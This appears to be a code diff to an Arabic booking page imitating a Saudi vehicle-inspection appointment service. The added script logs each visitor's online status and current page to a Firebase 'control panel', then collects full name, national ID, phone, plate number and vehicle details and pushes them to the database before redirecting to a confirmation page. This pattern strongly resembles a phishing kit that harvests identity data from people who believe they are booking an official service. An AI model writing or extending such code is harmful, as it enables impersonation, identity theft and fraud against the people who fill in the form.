@@ -297,6 +297,41 @@
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
 <script>
+    // تكوين Firebase الصحيح بناءً على معلوماتك
+    const firebaseConfig = {
+      apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8X6X8X6X8", // تم التعديل بناء على طلبك السابق
+      authDomain: "saso-inspection.firebaseapp.com",
+      databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
+      projectId: "saso-inspection",
+      storageBucket: "saso-inspection.appspot.com",
+      messagingSenderId: "1009002235896",
+      appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
+    };
+    
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // إدارة معرف الزائر visitorId للربط بين الصفحات ولوحة التحكم
+    let visitorId = localStorage.getItem('visitorId');
+    if (!visitorId) {
+        visitorId = 'user_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('visitorId', visitorId);
+    }
+
+    // تحديث حالة العميل "Online" في لوحة التحكم فور الدخول
+    const userRef = db.ref('visitors/' + visitorId);
+    userRef.update({
+        lastActive: firebase.database.ServerValue.TIMESTAMP,
+        currentPage: "صفحة الحجز (Booking)",
+        status: "online"
+    });
+
+    // تحويل الحالة إلى offline عند الخروج
+    userRef.onDisconnect().update({
+        status: "offline",
+        lastSeen: firebase.database.ServerValue.TIMESTAMP
+    });
+
     const centersData = {
         "الرياض": ["الرياض حي المونسية", "الرياض حي القيروان", "المجمعة", "المسار الامن الرياض حي القادسية", "جنوب شرق الرياض مخرج 17", "الرياض حي الشفا طريق ديراب", "الخرج", "شقراء", "مركز الفحص الفني الدوري في المزاحمية", "المسار الامن مركز محافظة الافلاج", "القويعية", "الرياض جامعة الملك سعود", "الزلفي", "الرياض حي المنار", "واجهة روشن", "أبراج التاج عفيف", "وادي الدواسر"],
         "مكة": ["الخرمة", "القنفذة", "جدة الشمال", "مكة المكرمة", "جدة عسفان", "جدة الجنوب", "الطائف", "الطائف حي النسيم"],
@@ -325,24 +360,6 @@
             });
         }
     }
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
-      authDomain: "saso-inspection.firebaseapp.com",
-      databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
-      projectId: "saso-inspection",
-      storageBucket: "saso-inspection.appspot.com",
-      messagingSenderId: "1009002235896",
-      appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
-    };
-    
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    db.ref('visits').transaction(current => (current || 0) + 1);
-
-    var map = L.map('map').setView([24.7136, 46.6753], 6);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
     function handleProxy() {
         document.getElementById('proxySection').style.display = document.getElementById('toggleProxy').checked ? "block" : "none";
@@ -374,7 +391,6 @@
     }
 
     function sendDataAndRedirect() {
-        // حقول البيانات الأساسية للتحقق
         const fullName = document.getElementById('full_name').value.trim();
         const idNumber = document.getElementById('id_number').value.trim();
         const nationality = document.getElementById('nationality').value;
@@ -384,7 +400,6 @@
         const fDate = document.getElementById('f_date').value;
         const fTime = document.getElementById('f_time').value;
 
-        // التحقق من ملء البيانات قبل أي شيء
         if (!fullName || !idNumber || !nationality || !phone || !region || !center || !fDate || !fTime) {
             alert("يرجى ملء جميع الحقول المطلوبة (المؤشر عليها بـ *) قبل الانتقال.");
             return;
@@ -394,6 +409,18 @@
         btn.disabled = true;
         btn.innerText = "جاري الحفظ...";
 
+        // تجهيز بيانات اللوحة في حال كانت رخصة سير
+        let plateData = "";
+        if(currentVehicleStatus === 'license') {
+            const c1 = document.getElementById('char1').value.split('|')[0] || "";
+            const c2 = document.getElementById('char2').value.split('|')[0] || "";
+            const c3 = document.getElementById('char3').value.split('|')[0] || "";
+            const num = document.getElementById('plateNumInput').value;
+            plateData = `${num} ${c1} ${c2} ${c3}`;
+        } else {
+            plateData = document.getElementById('customs_id').value;
+        }
+
         const formData = {
             fullName: fullName,
             idNumber: idNumber,
@@ -402,23 +429,33 @@
             email: document.getElementById('email').value,
             region: region,
             center: center,
-            date: fDate,
-            time: fTime,
+            bookingDate: fDate,
+            bookingTime: fTime,
             vehicleStatus: currentVehicleStatus,
-            timestamp: new Date().toLocaleString('ar-SA'),
-            status: "online" // لتعرف أنه موجود حالياً
+            plateOrCustoms: plateData,
+            regType: document.getElementById('reg_type').value,
+            vType: document.getElementById('v_type').value,
+            sType: document.getElementById('s_type').value,
+            lastUpdate: new Date().toLocaleString('ar-SA'),
+            status: "online"
         };
 
-        // إرسال البيانات والانتظار حتى النجاح قبل التوجيه
-        db.ref('orders').push(formData).then(() => {
-            console.log("Data saved successfully!");
-            window.location.href = "confirm.html";
+        // إرسال البيانات إلى مسار الزائر الفريد لضمان ظهورها في الوثيقة ولوحة التحكم
+        userRef.update(formData).then(() => {
+            // حفظ نسخة في الطلبات العامة أيضاً
+            db.ref('orders').push({ ...formData, visitorId: visitorId }).then(() => {
+                window.location.href = "confirm.html";
+            });
         }).catch(err => {
-            alert("حدث خطأ في الاتصال، تأكد من جودة الإنترنت: " + err.message);
+            alert("حدث خطأ: " + err.message);
             btn.disabled = false;
             btn.innerText = "التالي";
         });
     }
+
+    // تهيئة الخريطة بشكل بسيط
+    var map = L.map('map').setView([24.7136, 46.6753], 6);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 </script>
 </body>
 </html>
